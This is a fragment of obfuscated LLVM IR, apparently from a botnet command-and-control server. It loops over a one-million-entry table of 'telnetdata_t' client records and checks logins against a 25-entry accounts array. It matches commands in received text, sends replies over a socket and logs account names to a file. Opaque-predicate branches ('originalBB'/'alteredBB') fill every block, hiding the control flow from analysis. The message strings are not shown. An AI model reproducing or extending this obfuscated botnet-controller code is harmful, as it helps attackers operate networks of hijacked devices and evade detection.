; <label>:839:                                    ; preds = %830, %originalBBpart2114
  %840 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %841 = call i32 (i8*, i8*, ...) @sprintf(i8* %840, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.57, i32 0, i32 0)) #7
  %842 = load i32, i32* %4, align 4
  %843 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %844 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %845 = call i64 @strlen(i8* %844) #8
  %846 = call i64 @send(i32 %842, i8* %843, i64 %845, i32 16384)
  %847 = icmp eq i64 %846, -1
  br i1 %847, label %848, label %849

; <label>:848:                                    ; preds = %839
  br label %849

; <label>:849:                                    ; preds = %848, %839
  %850 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %851 = call i32 (i8*, i8*, ...) @sprintf(i8* %850, i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.58, i32 0, i32 0)) #7
  %852 = load i32, i32* %4, align 4
  %853 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %854 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %855 = call i64 @strlen(i8* %854) #8
  %856 = call i64 @send(i32 %852, i8* %853, i64 %855, i32 16384)
  %857 = icmp eq i64 %856, -1
  br i1 %857, label %858, label %859

; <label>:858:                                    ; preds = %849
  br label %859

; <label>:859:                                    ; preds = %858, %849
  %860 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %861 = call i32 (i8*, i8*, ...) @sprintf(i8* %860, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.59, i32 0, i32 0)) #7
  %862 = load i32, i32* %4, align 4
  %863 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %864 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %865 = call i64 @strlen(i8* %864) #8
  %866 = call i64 @send(i32 %862, i8* %863, i64 %865, i32 16384)
  %867 = icmp eq i64 %866, -1
  br i1 %867, label %868, label %869

; <label>:868:                                    ; preds = %859
  br label %869

; <label>:869:                                    ; preds = %868, %859
  %870 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %871 = call i32 (i8*, i8*, ...) @sprintf(i8* %870, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.60, i32 0, i32 0)) #7
  %872 = load i32, i32* %4, align 4
  %873 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %874 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %875 = call i64 @strlen(i8* %874) #8
  %876 = call i64 @send(i32 %872, i8* %873, i64 %875, i32 16384)
  %877 = icmp eq i64 %876, -1
  br i1 %877, label %878, label %879

; <label>:878:                                    ; preds = %869
  br label %879

; <label>:879:                                    ; preds = %878, %869
  %880 = load i32, i32* @x.23
  %881 = load i32, i32* @y.24
  %882 = sub i32 %880, 1
  %883 = mul i32 %880, %882
  %884 = urem i32 %883, 2
  %885 = icmp eq i32 %884, 0
  %886 = icmp slt i32 %881, 10
  %887 = or i1 %885, %886
  br i1 %887, label %originalBB116, label %originalBB116alteredBB

originalBB116:                                    ; preds = %originalBB116alteredBB, %879
  %888 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %889 = call i32 (i8*, i8*, ...) @sprintf(i8* %888, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.61, i32 0, i32 0)) #7
  %890 = load i32, i32* %4, align 4
  %891 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %892 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %893 = call i64 @strlen(i8* %892) #8
  %894 = call i64 @send(i32 %890, i8* %891, i64 %893, i32 16384)
  %895 = icmp eq i64 %894, -1
  %896 = load i32, i32* @x.23
  %897 = load i32, i32* @y.24
  %898 = sub i32 %896, 1
  %899 = mul i32 %896, %898
  %900 = urem i32 %899, 2
  %901 = icmp eq i32 %900, 0
  %902 = icmp slt i32 %897, 10
  %903 = or i1 %901, %902
  br i1 %903, label %originalBBpart2118, label %originalBB116alteredBB

originalBBpart2118:                               ; preds = %originalBB116
  br i1 %895, label %904, label %905

; <label>:904:                                    ; preds = %originalBBpart2118
  br label %905

; <label>:905:                                    ; preds = %904, %originalBBpart2118
  br label %933

; <label>:906:                                    ; preds = %830
  %907 = load i32, i32* @x.23
  %908 = load i32, i32* @y.24
  %909 = sub i32 %907, 1
  %910 = mul i32 %907, %909
  %911 = urem i32 %910, 2
  %912 = icmp eq i32 %911, 0
  %913 = icmp slt i32 %908, 10
  %914 = or i1 %912, %913
  br i1 %914, label %originalBB120, label %originalBB120alteredBB

originalBB120:                                    ; preds = %originalBB120alteredBB, %906
  %915 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %916 = call i32 (i8*, i8*, ...) @sprintf(i8* %915, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.62, i32 0, i32 0)) #7
  %917 = load i32, i32* %4, align 4
  %918 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %919 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %920 = call i64 @strlen(i8* %919) #8
  %921 = call i64 @send(i32 %917, i8* %918, i64 %920, i32 16384)
  %922 = icmp eq i64 %921, -1
  %923 = load i32, i32* @x.23
  %924 = load i32, i32* @y.24
  %925 = sub i32 %923, 1
  %926 = mul i32 %923, %925
  %927 = urem i32 %926, 2
  %928 = icmp eq i32 %927, 0
  %929 = icmp slt i32 %924, 10
  %930 = or i1 %928, %929
  br i1 %930, label %originalBBpart2122, label %originalBB120alteredBB

originalBBpart2122:                               ; preds = %originalBB120
  br i1 %922, label %931, label %932

; <label>:931:                                    ; preds = %originalBBpart2122
  br label %932

; <label>:932:                                    ; preds = %931, %originalBBpart2122
  br label %933

; <label>:933:                                    ; preds = %932, %905
  %934 = load i32, i32* @x.23
  %935 = load i32, i32* @y.24
  %936 = sub i32 %934, 1
  %937 = mul i32 %934, %936
  %938 = urem i32 %937, 2
  %939 = icmp eq i32 %938, 0
  %940 = icmp slt i32 %935, 10
  %941 = or i1 %939, %940
  br i1 %941, label %originalBB124, label %originalBB124alteredBB

originalBB124:                                    ; preds = %originalBB124alteredBB, %933
  %942 = load i32, i32* @x.23
  %943 = load i32, i32* @y.24
  %944 = sub i32 %942, 1
  %945 = mul i32 %942, %944
  %946 = urem i32 %945, 2
  %947 = icmp eq i32 %946, 0
  %948 = icmp slt i32 %943, 10
  %949 = or i1 %947, %948
  br i1 %949, label %originalBBpart2126, label %originalBB124alteredBB

originalBBpart2126:                               ; preds = %originalBB124
  br label %950

; <label>:950:                                    ; preds = %originalBBpart2126, %originalBBpart2110
  %951 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %952 = call i8* @strstr(i8* %951, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0)) #8
  %953 = icmp ne i8* %952, null
  br i1 %953, label %954, label %1007

; <label>:954:                                    ; preds = %950
  %955 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %956 = call i32 (i8*, i8*, ...) @sprintf(i8* %955, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.64, i32 0, i32 0)) #7
  %957 = load i32, i32* %4, align 4
  %958 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %959 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %960 = call i64 @strlen(i8* %959) #8
  %961 = call i64 @send(i32 %957, i8* %958, i64 %960, i32 16384)
  %962 = icmp eq i64 %961, -1
  br i1 %962, label %963, label %964

; <label>:963:                                    ; preds = %954
  br label %964

; <label>:964:                                    ; preds = %963, %954
  %965 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %966 = call i32 (i8*, i8*, ...) @sprintf(i8* %965, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.65, i32 0, i32 0)) #7
  %967 = load i32, i32* %4, align 4
  %968 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %969 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %970 = call i64 @strlen(i8* %969) #8
  %971 = call i64 @send(i32 %967, i8* %968, i64 %970, i32 16384)
  %972 = icmp eq i64 %971, -1
  br i1 %972, label %973, label %990

; <label>:973:                                    ; preds = %964
  %974 = load i32, i32* @x.23
  %975 = load i32, i32* @y.24
  %976 = sub i32 %974, 1
  %977 = mul i32 %974, %976
  %978 = urem i32 %977, 2
  %979 = icmp eq i32 %978, 0
  %980 = icmp slt i32 %975, 10
  %981 = or i1 %979, %980
  br i1 %981, label %originalBB128, label %originalBB128alteredBB

originalBB128:                                    ; preds = %originalBB128alteredBB, %973
  %982 = load i32, i32* @x.23
  %983 = load i32, i32* @y.24
  %984 = sub i32 %982, 1
  %985 = mul i32 %982, %984
  %986 = urem i32 %985, 2
  %987 = icmp eq i32 %986, 0
  %988 = icmp slt i32 %983, 10
  %989 = or i1 %987, %988
  br i1 %989, label %originalBBpart2130, label %originalBB128alteredBB

originalBBpart2130:                               ; preds = %originalBB128
  br label %990

; <label>:990:                                    ; preds = %originalBBpart2130, %964
  %991 = load i32, i32* @x.23
  %992 = load i32, i32* @y.24
  %993 = sub i32 %991, 1
  %994 = mul i32 %991, %993
  %995 = urem i32 %994, 2
  %996 = icmp eq i32 %995, 0
  %997 = icmp slt i32 %992, 10
  %998 = or i1 %996, %997
  br i1 %998, label %originalBB132, label %originalBB132alteredBB

originalBB132:                                    ; preds = %originalBB132alteredBB, %990
  %999 = load i32, i32* @x.23
  %1000 = load i32, i32* @y.24
  %1001 = sub i32 %999, 1
  %1002 = mul i32 %999, %1001
  %1003 = urem i32 %1002, 2
  %1004 = icmp eq i32 %1003, 0
  %1005 = icmp slt i32 %1000, 10
  %1006 = or i1 %1004, %1005
  br i1 %1006, label %originalBBpart2134, label %originalBB132alteredBB

originalBBpart2134:                               ; preds = %originalBB132
  br label %1007

; <label>:1007:                                   ; preds = %originalBBpart2134, %950
  %1008 = load i32, i32* @x.23
  %1009 = load i32, i32* @y.24
  %1010 = sub i32 %1008, 1
  %1011 = mul i32 %1008, %1010
  %1012 = urem i32 %1011, 2
  %1013 = icmp eq i32 %1012, 0
  %1014 = icmp slt i32 %1009, 10
  %1015 = or i1 %1013, %1014
  br i1 %1015, label %originalBB136, label %originalBB136alteredBB

originalBB136:                                    ; preds = %originalBB136alteredBB, %1007
  %1016 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1017 = call i8* @strstr(i8* %1016, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0)) #8
  %1018 = icmp ne i8* %1017, null
  %1019 = load i32, i32* @x.23
  %1020 = load i32, i32* @y.24
  %1021 = sub i32 %1019, 1
  %1022 = mul i32 %1019, %1021
  %1023 = urem i32 %1022, 2
  %1024 = icmp eq i32 %1023, 0
  %1025 = icmp slt i32 %1020, 10
  %1026 = or i1 %1024, %1025
  br i1 %1026, label %originalBBpart2138, label %originalBB136alteredBB

originalBBpart2138:                               ; preds = %originalBB136
  br i1 %1018, label %1047, label %1027

; <label>:1027:                                   ; preds = %originalBBpart2138
  %1028 = load i32, i32* @x.23
  %1029 = load i32, i32* @y.24
  %1030 = sub i32 %1028, 1
  %1031 = mul i32 %1028, %1030
  %1032 = urem i32 %1031, 2
  %1033 = icmp eq i32 %1032, 0
  %1034 = icmp slt i32 %1029, 10
  %1035 = or i1 %1033, %1034
  br i1 %1035, label %originalBB140, label %originalBB140alteredBB

originalBB140:                                    ; preds = %originalBB140alteredBB, %1027
  %1036 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1037 = call i8* @strstr(i8* %1036, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.67, i32 0, i32 0)) #8
  %1038 = icmp ne i8* %1037, null
  %1039 = load i32, i32* @x.23
  %1040 = load i32, i32* @y.24
  %1041 = sub i32 %1039, 1
  %1042 = mul i32 %1039, %1041
  %1043 = urem i32 %1042, 2
  %1044 = icmp eq i32 %1043, 0
  %1045 = icmp slt i32 %1040, 10
  %1046 = or i1 %1044, %1045
  br i1 %1046, label %originalBBpart2142, label %originalBB140alteredBB

originalBBpart2142:                               ; preds = %originalBB140
  br i1 %1038, label %1047, label %1111

; <label>:1047:                                   ; preds = %originalBBpart2142, %originalBBpart2138
  %1048 = load i32, i32* @x.23
  %1049 = load i32, i32* @y.24
  %1050 = sub i32 %1048, 1
  %1051 = mul i32 %1048, %1050
  %1052 = urem i32 %1051, 2
  %1053 = icmp eq i32 %1052, 0
  %1054 = icmp slt i32 %1049, 10
  %1055 = or i1 %1053, %1054
  br i1 %1055, label %originalBB144, label %originalBB144alteredBB

originalBB144:                                    ; preds = %originalBB144alteredBB, %1047
  %1056 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1057 = call i32 (i8*, i8*, ...) @sprintf(i8* %1056, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0)) #7
  %1058 = load i32, i32* %4, align 4
  %1059 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1060 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1061 = call i64 @strlen(i8* %1060) #8
  %1062 = call i64 @send(i32 %1058, i8* %1059, i64 %1061, i32 16384)
  %1063 = icmp eq i64 %1062, -1
  %1064 = load i32, i32* @x.23
  %1065 = load i32, i32* @y.24
  %1066 = sub i32 %1064, 1
  %1067 = mul i32 %1064, %1066
  %1068 = urem i32 %1067, 2
  %1069 = icmp eq i32 %1068, 0
  %1070 = icmp slt i32 %1065, 10
  %1071 = or i1 %1069, %1070
  br i1 %1071, label %originalBBpart2146, label %originalBB144alteredBB

originalBBpart2146:                               ; preds = %originalBB144
  br i1 %1063, label %1072, label %1089

; <label>:1072:                                   ; preds = %originalBBpart2146
  %1073 = load i32, i32* @x.23
  %1074 = load i32, i32* @y.24
  %1075 = sub i32 %1073, 1
  %1076 = mul i32 %1073, %1075
  %1077 = urem i32 %1076, 2
  %1078 = icmp eq i32 %1077, 0
  %1079 = icmp slt i32 %1074, 10
  %1080 = or i1 %1078, %1079
  br i1 %1080, label %originalBB148, label %originalBB148alteredBB

originalBB148:                                    ; preds = %originalBB148alteredBB, %1072
  %1081 = load i32, i32* @x.23
  %1082 = load i32, i32* @y.24
  %1083 = sub i32 %1081, 1
  %1084 = mul i32 %1081, %1083
  %1085 = urem i32 %1084, 2
  %1086 = icmp eq i32 %1085, 0
  %1087 = icmp slt i32 %1082, 10
  %1088 = or i1 %1086, %1087
  br i1 %1088, label %originalBBpart2150, label %originalBB148alteredBB

originalBBpart2150:                               ; preds = %originalBB148
  br label %1089

; <label>:1089:                                   ; preds = %originalBBpart2150, %originalBBpart2146
  %1090 = load i32, i32* %4, align 4
  %1091 = call i64 @send(i32 %1090, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.69, i32 0, i32 0), i64 17, i32 16384)
  %1092 = icmp eq i64 %1091, -1
  br i1 %1092, label %1093, label %1094

; <label>:1093:                                   ; preds = %1089
  br label %1920

; <label>:1094:                                   ; preds = %1089
  %1095 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %1095, %struct._IO_FILE** %32, align 8
  %1096 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %1097 = load i32, i32* %5, align 4
  %1098 = sext i32 %1097 to i64
  %1099 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1098
  %1100 = getelementptr inbounds %struct.account, %struct.account* %1099, i32 0, i32 0
  %1101 = getelementptr inbounds [200 x i8], [200 x i8]* %1100, i32 0, i32 0
  %1102 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1096, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %1101)
  %1103 = load %struct._IO_FILE*, %struct._IO_FILE** %32, align 8
  %1104 = call i32 @fclose(%struct._IO_FILE* %1103)
  %1105 = load i32, i32* %5, align 4
  %1106 = sext i32 %1105 to i64
  %1107 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1106
  %1108 = getelementptr inbounds %struct.account, %struct.account* %1107, i32 0, i32 0
  %1109 = getelementptr inbounds [200 x i8], [200 x i8]* %1108, i32 0, i32 0
  %1110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.71, i32 0, i32 0), i8* %1109)
  br label %1111

; <label>:1111:                                   ; preds = %1094, %originalBBpart2142
  %1112 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1113 = call i8* @strstr(i8* %1112, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.72, i32 0, i32 0)) #8
  %1114 = icmp ne i8* %1113, null
  br i1 %1114, label %1115, label %1132

; <label>:1115:                                   ; preds = %1111
  %1116 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.31, i32 0, i32 0))
  store %struct._IO_FILE* %1116, %struct._IO_FILE** %33, align 8
  %1117 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %1118 = load i32, i32* %5, align 4
  %1119 = sext i32 %1118 to i64
  %1120 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1119
  %1121 = getelementptr inbounds %struct.account, %struct.account* %1120, i32 0, i32 0
  %1122 = getelementptr inbounds [200 x i8], [200 x i8]* %1121, i32 0, i32 0
  %1123 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1117, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %1122)
  %1124 = load %struct._IO_FILE*, %struct._IO_FILE** %33, align 8
  %1125 = call i32 @fclose(%struct._IO_FILE* %1124)
  %1126 = load i32, i32* %5, align 4
  %1127 = sext i32 %1126 to i64
  %1128 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1127
  %1129 = getelementptr inbounds %struct.account, %struct.account* %1128, i32 0, i32 0
  %1130 = getelementptr inbounds [200 x i8], [200 x i8]* %1129, i32 0, i32 0
  %1131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.73, i32 0, i32 0), i8* %1130)
  br label %1132

; <label>:1132:                                   ; preds = %1115, %1111
  %1133 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1134 = call i8* @strstr(i8* %1133, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.74, i32 0, i32 0)) #8
  %1135 = icmp ne i8* %1134, null
  br i1 %1135, label %1136, label %1174

; <label>:1136:                                   ; preds = %1132
  %1137 = load i32, i32* @x.23
  %1138 = load i32, i32* @y.24
  %1139 = sub i32 %1137, 1
  %1140 = mul i32 %1137, %1139
  %1141 = urem i32 %1140, 2
  %1142 = icmp eq i32 %1141, 0
  %1143 = icmp slt i32 %1138, 10
  %1144 = or i1 %1142, %1143
  br i1 %1144, label %originalBB152, label %originalBB152alteredBB

originalBB152:                                    ; preds = %originalBB152alteredBB, %1136
  %1145 = load i32, i32* %4, align 4
  %1146 = call i64 @send(i32 %1145, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.36, i32 0, i32 0), i64 16, i32 16384)
  %1147 = icmp eq i64 %1146, -1
  %1148 = load i32, i32* @x.23
  %1149 = load i32, i32* @y.24
  %1150 = sub i32 %1148, 1
  %1151 = mul i32 %1148, %1150
  %1152 = urem i32 %1151, 2
  %1153 = icmp eq i32 %1152, 0
  %1154 = icmp slt i32 %1149, 10
  %1155 = or i1 %1153, %1154
  br i1 %1155, label %originalBBpart2154, label %originalBB152alteredBB

originalBBpart2154:                               ; preds = %originalBB152
  br i1 %1147, label %1156, label %1173

; <label>:1156:                                   ; preds = %originalBBpart2154
  %1157 = load i32, i32* @x.23
  %1158 = load i32, i32* @y.24
  %1159 = sub i32 %1157, 1
  %1160 = mul i32 %1157, %1159
  %1161 = urem i32 %1160, 2
  %1162 = icmp eq i32 %1161, 0
  %1163 = icmp slt i32 %1158, 10
  %1164 = or i1 %1162, %1163
  br i1 %1164, label %originalBB156, label %originalBB156alteredBB

originalBB156:                                    ; preds = %originalBB156alteredBB, %1156
  %1165 = load i32, i32* @x.23
  %1166 = load i32, i32* @y.24
  %1167 = sub i32 %1165, 1
  %1168 = mul i32 %1165, %1167
  %1169 = urem i32 %1168, 2
  %1170 = icmp eq i32 %1169, 0
  %1171 = icmp slt i32 %1166, 10
  %1172 = or i1 %1170, %1171
  br i1 %1172, label %originalBBpart2158, label %originalBB156alteredBB

originalBBpart2158:                               ; preds = %originalBB156
  br label %1920

; <label>:1173:                                   ; preds = %originalBBpart2154
  br label %1174

; <label>:1174:                                   ; preds = %1173, %1132
  %1175 = load i32, i32* @x.23
  %1176 = load i32, i32* @y.24
  %1177 = sub i32 %1175, 1
  %1178 = mul i32 %1175, %1177
  %1179 = urem i32 %1178, 2
  %1180 = icmp eq i32 %1179, 0
  %1181 = icmp slt i32 %1176, 10
  %1182 = or i1 %1180, %1181
  br i1 %1182, label %originalBB160, label %originalBB160alteredBB

originalBB160:                                    ; preds = %originalBB160alteredBB, %1174
  %1183 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1184 = call i8* @strstr(i8* %1183, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0)) #8
  %1185 = icmp ne i8* %1184, null
  %1186 = load i32, i32* @x.23
  %1187 = load i32, i32* @y.24
  %1188 = sub i32 %1186, 1
  %1189 = mul i32 %1186, %1188
  %1190 = urem i32 %1189, 2
  %1191 = icmp eq i32 %1190, 0
  %1192 = icmp slt i32 %1187, 10
  %1193 = or i1 %1191, %1192
  br i1 %1193, label %originalBBpart2162, label %originalBB160alteredBB

originalBBpart2162:                               ; preds = %originalBB160
  br i1 %1185, label %1194, label %1419

; <label>:1194:                                   ; preds = %originalBBpart2162
  %1195 = load i32, i32* @x.23
  %1196 = load i32, i32* @y.24
  %1197 = sub i32 %1195, 1
  %1198 = mul i32 %1195, %1197
  %1199 = urem i32 %1198, 2
  %1200 = icmp eq i32 %1199, 0
  %1201 = icmp slt i32 %1196, 10
  %1202 = or i1 %1200, %1201
  br i1 %1202, label %originalBB164, label %originalBB164alteredBB

originalBB164:                                    ; preds = %originalBB164alteredBB, %1194
  %1203 = load i8*, i8** %12, align 8
  %1204 = load i32, i32* %5, align 4
  %1205 = sext i32 %1204 to i64
  %1206 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1205
  %1207 = getelementptr inbounds %struct.account, %struct.account* %1206, i32 0, i32 2
  %1208 = getelementptr inbounds [200 x i8], [200 x i8]* %1207, i32 0, i32 0
  %1209 = call i32 @strcmp(i8* %1203, i8* %1208) #8
  %1210 = icmp eq i32 %1209, 0
  %1211 = load i32, i32* @x.23
  %1212 = load i32, i32* @y.24
  %1213 = sub i32 %1211, 1
  %1214 = mul i32 %1211, %1213
  %1215 = urem i32 %1214, 2
  %1216 = icmp eq i32 %1215, 0
  %1217 = icmp slt i32 %1212, 10
  %1218 = or i1 %1216, %1217
  br i1 %1218, label %originalBBpart2166, label %originalBB164alteredBB

originalBBpart2166:                               ; preds = %originalBB164
  br i1 %1210, label %1228, label %1219

; <label>:1219:                                   ; preds = %originalBBpart2166
  %1220 = load i8*, i8** %13, align 8
  %1221 = load i32, i32* %5, align 4
  %1222 = sext i32 %1221 to i64
  %1223 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1222
  %1224 = getelementptr inbounds %struct.account, %struct.account* %1223, i32 0, i32 2
  %1225 = getelementptr inbounds [200 x i8], [200 x i8]* %1224, i32 0, i32 0
  %1226 = call i32 @strcmp(i8* %1220, i8* %1225) #8
  %1227 = icmp eq i32 %1226, 0
  br i1 %1227, label %1228, label %1375

; <label>:1228:                                   ; preds = %1219, %originalBBpart2166
  %1229 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1230 = call i8* @strcpy(i8* %1229, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.76, i32 0, i32 0)) #7
  %1231 = load i32, i32* %4, align 4
  %1232 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1233 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1234 = call i64 @strlen(i8* %1233) #8
  %1235 = call i64 @send(i32 %1231, i8* %1232, i64 %1234, i32 16384)
  %1236 = icmp eq i64 %1235, -1
  br i1 %1236, label %1237, label %1254

; <label>:1237:                                   ; preds = %1228
  %1238 = load i32, i32* @x.23
  %1239 = load i32, i32* @y.24
  %1240 = sub i32 %1238, 1
  %1241 = mul i32 %1238, %1240
  %1242 = urem i32 %1241, 2
  %1243 = icmp eq i32 %1242, 0
  %1244 = icmp slt i32 %1239, 10
  %1245 = or i1 %1243, %1244
  br i1 %1245, label %originalBB168, label %originalBB168alteredBB

originalBB168:                                    ; preds = %originalBB168alteredBB, %1237
  store i8* null, i8** %2, align 8
  %1246 = load i32, i32* @x.23
  %1247 = load i32, i32* @y.24
  %1248 = sub i32 %1246, 1
  %1249 = mul i32 %1246, %1248
  %1250 = urem i32 %1249, 2
  %1251 = icmp eq i32 %1250, 0
  %1252 = icmp slt i32 %1247, 10
  %1253 = or i1 %1251, %1252
  br i1 %1253, label %originalBBpart2170, label %originalBB168alteredBB

originalBBpart2170:                               ; preds = %originalBB168
  br label %1929

; <label>:1254:                                   ; preds = %1228
  %1255 = load i32, i32* @x.23
  %1256 = load i32, i32* @y.24
  %1257 = sub i32 %1255, 1
  %1258 = mul i32 %1255, %1257
  %1259 = urem i32 %1258, 2
  %1260 = icmp eq i32 %1259, 0
  %1261 = icmp slt i32 %1256, 10
  %1262 = or i1 %1260, %1261
  br i1 %1262, label %originalBB172, label %originalBB172alteredBB

originalBB172:                                    ; preds = %originalBB172alteredBB, %1254
  store i32 0, i32* %34, align 4
  %1263 = load i32, i32* @x.23
  %1264 = load i32, i32* @y.24
  %1265 = sub i32 %1263, 1
  %1266 = mul i32 %1263, %1265
  %1267 = urem i32 %1266, 2
  %1268 = icmp eq i32 %1267, 0
  %1269 = icmp slt i32 %1264, 10
  %1270 = or i1 %1268, %1269
  br i1 %1270, label %originalBBpart2174, label %originalBB172alteredBB

originalBBpart2174:                               ; preds = %originalBB172
  br label %1271

; <label>:1271:                                   ; preds = %originalBBpart2197, %originalBBpart2174
  %1272 = load i32, i32* %34, align 4
  %1273 = icmp slt i32 %1272, 1000000
  br i1 %1273, label %1274, label %1374

; <label>:1274:                                   ; preds = %1271
  %1275 = load i32, i32* %34, align 4
  %1276 = sext i32 %1275 to i64
  %1277 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1276
  %1278 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1277, i32 0, i32 2
  %1279 = getelementptr inbounds [20 x i8], [20 x i8]* %1278, i32 0, i32 0
  %1280 = call i64 @strlen(i8* %1279) #8
  %1281 = icmp ugt i64 %1280, 1
  br i1 %1281, label %1282, label %1338

; <label>:1282:                                   ; preds = %1274
  %1283 = load i32, i32* %34, align 4
  %1284 = sext i32 %1283 to i64
  %1285 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1284
  %1286 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1285, i32 0, i32 1
  %1287 = load i32, i32* %1286, align 4
  %1288 = icmp eq i32 %1287, 1
  br i1 %1288, label %1289, label %1338

; <label>:1289:                                   ; preds = %1282
  %1290 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1291 = load i32, i32* %34, align 4
  %1292 = load i32, i32* %34, align 4
  %1293 = sext i32 %1292 to i64
  %1294 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1293
  %1295 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1294, i32 0, i32 2
  %1296 = getelementptr inbounds [20 x i8], [20 x i8]* %1295, i32 0, i32 0
  %1297 = call i32 (i8*, i8*, ...) @sprintf(i8* %1290, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.77, i32 0, i32 0), i32 %1291, i8* %1296) #7
  %1298 = load i32, i32* %4, align 4
  %1299 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1300 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i32 0, i32 0
  %1301 = call i64 @strlen(i8* %1300) #8
